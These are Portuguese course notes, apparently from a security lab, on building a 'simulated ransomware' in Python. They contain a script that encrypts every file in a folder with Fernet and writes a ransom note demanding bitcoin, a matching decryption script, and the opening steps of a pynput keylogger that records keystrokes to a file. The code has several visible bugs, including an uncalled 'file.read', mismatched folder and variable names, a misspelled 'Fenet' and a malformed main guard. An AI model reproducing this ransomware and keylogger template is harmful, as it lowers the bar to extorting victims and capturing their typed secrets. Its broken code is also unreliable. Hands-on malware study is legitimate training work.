#Ransomware Simulado

Criar arquivos de teste, implementar um script que criptografa e descriptografa, além de gerar mensagem de “resgate"

- Criar uma pasta com o nome **test_files**
+ Dentro dele criar uma arquivo **senhas.txt**
*Com conteúdo: senha1: DIO_2025@hackers!@#



+ Criar um arquivo: **dados_confidenciais**
*Com conteúdo (apenas para simular um conteúdo qualquer):
sdçfkjasdçfkjaçskdlfjaçsdklfjçakdslfjçlkasjdfçlkajsfaçskldfjasçklfjklsjfkldsçjfkçlsfjasçfjçsdlfjaçslfjaçdsfklasçjfdçlkasdjfaçksldfjçklasjfdkl

Fora da pasta test_files criar um arquivo chamado **ransoware.py**

```python
from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
	chave = Fernet.generate_key() 
	with open("chave.key", "wb") as chave_file:
		chave_file.write(chave)
		
#2. Carregar a chave salva
def carregar_chave():
	return open("chave.key", "rb").read()
	
#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
	f=Fernet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read
		dados_encriptados = f.encrypt(dados)
		with open(arquivo, "wb") as file:
			file.write(dados_encriptados)
			
#4. Encontrar aquivos para criptografar
def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransoware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
	with open("LEIA_ISSO.txt", "w") as f:
		f.write("Seus arquivos foram criptografados!\n")
		f.write("Envie 1 bitcoin para o endereço x e envie o comprovante!\n")
		f.write("Depois disso, enviaremos a chave para você recuperar seus dados\n")
		
#6. Execução principal do código
def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos = encontrar_arquivos("teste_files")
	for arquivo in arquivos:
		criptografar_arquivo(arquivo, chave)
	criar_mensagem_resgate()
	print("Ransoware executado! Arquivos criptografados!")

if __name__ == "__main__ ":
	main()
```

Executar **python .\ransoware.py** 

Depois de executar o script os arquivos **dados_confidenciais** e **senhas.txt** estarão criptografados e será gerado um arquivo **chave.key**

#Descriptografar

Criar **descriptografar.py**

```python 
from cryptography.fernet import Fernet
import os

def carregar_chave():
	return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
	f = Fenet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read()
		dados_descriptografos = f.decrypt(dados)
	with open(arquivo, "wb") as file:
		file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransoware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

def main():
	chave = carregar_chave()
	arquivos = encontrar_arquivos("test_files")
	for arquivo in arquivos:
		descriptografar_arquivo(arquivo, chave)
	print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
	main()
```

Executar **python .\descriptografar.py**

Então os arquivos serão descriptografados.

#Keylogger

Criar uma nova pasta chamada **keylogger**

Instalar biblioteca pynput no console:
**pip install pynput**

Perguntas:
1 - Vai ficar em execução em segundo plano?
2 - Toda vez que o usuário digitar uma tecla, o programa vai capturar essa tecla.
3 - O que for digitado, será gravado em um arquivo .txt.
4 - O arquivo vai mostrar tudo o que foi digitado, de forma sequencial.




Parei em Criando nosso Keylogger
